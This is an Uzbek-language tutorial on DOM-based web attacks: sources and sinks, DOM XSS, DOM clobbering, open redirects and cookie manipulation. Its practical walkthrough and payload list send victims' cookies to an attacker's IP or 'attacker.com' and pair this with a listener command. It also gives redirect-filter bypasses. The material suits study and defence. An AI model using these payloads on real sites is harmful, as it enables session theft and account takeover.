# 🌐 DOM-Based Attacks (DOM Asosidagi Hujumlar)

> **Maqsad:** Brauzerning DOM (Document Object Model — Hujjat Ob'ekt Modeli) ini JavaScript orqali manipulyatsiya qilib, XSS va boshqa hujumlarni amalga oshirish.

---

## 📖 Asosiy Tushunchalar

### DOM nima?
**DOM (Document Object Model)** — brauzer HTML sahifani o'qib, uni JavaScript bilan boshqarish mumkin bo'lgan daraxt (tree) strukturasiga aylantiradi.

```
HTML:                          DOM daraxti:
<html>                         document
  <body>                       └── html
    <h1>Salom</h1>                 └── body
    <p id="msg">Xabar</p>              ├── h1 → "Salom"
  </body>                             └── p#msg → "Xabar"
</html>
```

JavaScript DOM ni o'zgartira oladi:
```javascript
document.getElementById("msg").innerHTML = "Yangi xabar";
document.location = "http://boshqa-sayt.com";
```

---

### DOM-Based XSS nima?
Oddiy XSS da server javobida zararli kod bo'ladi.  
DOM-Based XSS da esa **hamma narsa brauzerda** sodir bo'ladi — server hech narsa bilmaydi!

```
Oddiy (Reflected) XSS:
Foydalanuvchi → Server → Zararli javob → Brauzer

DOM-Based XSS:
Foydalanuvchi → Brauzer (JavaScript) → Zararli kod ishlaydi
                    ↑ Server ishtirok etmaydi!
```

---

### Source va Sink nima?

| Atama | Ma'nosi | Misol |
|-------|---------|-------|
| **Source** (Manba) | Hujumchi nazorat qila oladigan kirish joyi | `location.search`, `location.hash`, `document.referrer`, `document.cookie` |
| **Sink** (Qabul qiluvchi) | Xavfli funksiya — source dan ma'lumot oladi | `innerHTML`, `eval()`, `document.write()`, `location.href` |

**Zaiflik qachon bo'ladi?**
```
Source → [hech qanday filtrlashsiz] → Sink
```

---

## 🔍 Xavfli Source lar

```javascript
// URL dan ma'lumot oluvchilar:
document.location
document.location.href
document.location.search    // ?dan keyingi qism
document.location.hash      // #dan keyingi qism
document.URL
document.documentURI
window.location

// Boshqa source lar:
document.referrer           // Oldingi sahifa URL si
document.cookie             // Cookie lar
localStorage.getItem()      // Mahalliy saqlash
sessionStorage.getItem()    // Sessiya saqlash
window.name                 // Oyna nomi
```

---

## 💀 Xavfli Sink lar

### HTML Sinklari (XSS uchun):
```javascript
element.innerHTML = SOURCE        // ⚠️ Eng xavfli
element.outerHTML = SOURCE
document.write(SOURCE)
document.writeln(SOURCE)
element.insertAdjacentHTML()
```

### JavaScript Sinklari (Kod ishlatish):
```javascript
eval(SOURCE)                      // ⚠️ Juda xavfli
setTimeout(SOURCE, 1000)
setInterval(SOURCE, 1000)
new Function(SOURCE)
```

### URL/Navigation Sinklari (Open Redirect):
```javascript
location.href = SOURCE            // ⚠️ Redirect
location.assign(SOURCE)
location.replace(SOURCE)
window.open(SOURCE)
```

### Script/Resource Yuklash:
```javascript
script.src = SOURCE               // Tashqi skript
iframe.src = SOURCE
link.href = SOURCE
```

---

## 🧪 DOM XSS Turlari

### 1. innerHTML Sink
```javascript
// Zaif kod:
var search = document.location.search;
document.getElementById("output").innerHTML = search;

// URL:
https://target.com/?name=<img src=x onerror=alert(1)>
// Natija: img tegi DOM ga qo'shiladi → onerror ishlaydi → XSS!

// Nima uchun <script> ishlamaydi?
// innerHTML orqali qo'shilgan <script> teglar ishlamaydi!
// Shuning uchun: img, svg, body, input teglaridan foydalaniladi
```

### 2. eval() Sink
```javascript
// Zaif kod:
var data = location.hash.slice(1);
eval(data);

// URL:
https://target.com/#alert(document.cookie)
// Natija: eval("alert(document.cookie)") → ishlaydi!
```

### 3. document.write() Sink
```javascript
// Zaif kod:
document.write('<h1>' + location.search + '</h1>');

// URL:
https://target.com/?q=</h1><script>alert(1)</script>
// Natija: document.write('<h1></h1><script>alert(1)</script><h1>')
```

### 4. location.href Sink (Open Redirect)
```javascript
// Zaif kod:
var redirect = location.search.split('url=')[1];
location.href = redirect;

// URL:
https://target.com/?url=https://evil.com
// Natija: foydalanuvchi evil.com ga yo'naltiriladi!

// XSS uchun:
https://target.com/?url=javascript:alert(1)
```

---

## 🔎 DOM XSS Topish Usullari

### 1. Qo'lda (Brauzer DevTools)
```javascript
// Console da source larni tekshirish:
console.log(location.search)    // URL parametrlarini ko'r
console.log(location.hash)      // Hash qismini ko'r
console.log(document.referrer)  // Referrer ni ko'r

// DOM da innerHTML ni izlash:
// F12 → Sources → JS fayllarini oching
// Ctrl+F → "innerHTML" qidiring
// Ctrl+F → "eval(" qidiring
// Ctrl+F → "document.write(" qidiring
```

### 2. DOM Invader (Burp Suite)
```
1. Burp Suite → Proxy → Intercept
2. Browser → F12 → Extensions → DOM Invader yoqing
3. Canary (noyob belgi) avtomatik barcha source larga kiritiladi
4. Qaysi sink da chiqsa → zaiflik topildi!
```

### 3. JavaScript Fayllarni Ko'rish
```javascript
// F12 → Debugger/Sources tab
// Barcha .js fayllarni oching va qidiring:
innerHTML
outerHTML
document.write
eval(
location.href =
location.assign
location.replace
setTimeout(
setInterval(
```

---

## 🚀 DOM Clobbering (DOM ni "Yo'q Qilish")

HTML atributlari orqali JavaScript o'zgaruvchilarini ustiga yozish.

```html
<!-- Zaif JavaScript kodi: -->
<script>
  var config = window.config || {isAdmin: false};
  if(config.isAdmin) { showAdminPanel(); }
</script>

<!-- Hujum — HTML kiritish imkoni bo'lsa: -->
<a id="config" isAdmin="true">Click</a>
<!-- yoki -->
<form id="config"><input id="isAdmin" value="true"></form>

<!-- Natija: window.config → HTML elementiga ishora qiladi
     config.isAdmin → "true" → admin panel ochiladi! -->
```

---

## 🌐 DOM-Based Open Redirect

```javascript
// Zaif kod:
var url = new URLSearchParams(location.search).get('redirect');
window.location = url;

// Hujum:
https://target.com/?redirect=https://evil.com
https://target.com/?redirect=javascript:alert(1)

// Filtr bypass (https:// tekshirilsa):
https://target.com/?redirect=//evil.com
https://target.com/?redirect=https://evil.com@target.com
```

---

## 🍪 DOM-Based Cookie Manipulation

```javascript
// Zaif kod:
document.cookie = "theme=" + location.hash.slice(1);

// Hujum:
https://target.com/#dark; session=hacker_token

// Natija: Cookie ga qo'shimcha ma'lumot yoziladi
```

---

## 🎯 Amaliy Misol: DOM XSS Topish va Ishlatish

```
# 1-qadam: Saytni oching va URL parametrlarini sinab ko'ring
https://target.com/?search=test
# Sahifada "test" chiqadimi? → Source bo'lishi mumkin

# 2-qadam: F12 → Sources → JS fayllarini ko'ring
# "search" o'zgaruvchisi qaysi sink ga ketayotganini toping

# Topildi:
var query = location.search.split('search=')[1];
document.getElementById('results').innerHTML = query;
# innerHTML sink! → DOM XSS zaiflik!

# 3-qadam: Payload sinash
https://target.com/?search=<img src=x onerror=alert(1)>
# Alert chiqdi → XSS tasdiqlandi!

# 4-qadam: Cookie o'g'irlash
https://target.com/?search=<img src=x onerror="document.location='http://YOUR_IP:8000/?c='+document.cookie">

# 5-qadam: Tinglovchi
python3 -m http.server 8000
# Qurbonning cookie si keladi!
```

---

## 🔬 DOM XSS Payloadlari (Sink ga qarab)

```javascript
// innerHTML sink uchun:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<iframe onload=alert(1)>

// eval() sink uchun:
alert(1)
alert(document.cookie)
fetch('http://attacker.com/?c='+document.cookie)

// document.write() sink uchun:
</script><script>alert(1)</script>
<img src=x onerror=alert(1)>

// location.href sink uchun (javascript: protokol):
javascript:alert(1)
javascript:fetch('http://attacker.com/?c='+document.cookie)

// Hash (#) orqali:
https://target.com/#<img src=x onerror=alert(1)>
https://target.com/#alert(1)    (eval sink uchun)
```

---

## 💡 Eslab Qolish Uchun

### Source → Sink zanjiri:
```
location.search → innerHTML   = DOM XSS (HTML)
location.hash   → eval()      = DOM XSS (JS kod)
location.href   → location=   = Open Redirect
document.cookie → document.write = Cookie exposure
```

### Asosiy farqlar:

| Tur | Server biladi? | Payload qayerda? |
|-----|---------------|-----------------|
| Reflected XSS | ✅ Ha | URL da |
| Stored XSS | ✅ Ha | Bazada |
| DOM-Based XSS | ❌ Yo'q | URL/hash da, JS ishlaydi |

### Tezkor eslatma:
- **Source** = Hujumchi nazorat qiladi (`location.search`, `location.hash`)
- **Sink** = Xavfli funksiya (`innerHTML`, `eval()`, `location.href`)
- **DOM XSS** = Source → Sink, server ishtirokisiz
- `innerHTML` da `<script>` ishlamaydi → `<img onerror=>` ishla!
- `eval()` sink da to'g'ridan JavaScript yoz: `alert(1)`
- **DOM Clobbering** = HTML element orqali JS o'zgaruvchisini ustiga yoz
- **Open Redirect** = `location.href = user_input` → `javascript:` yoki tashqi URL
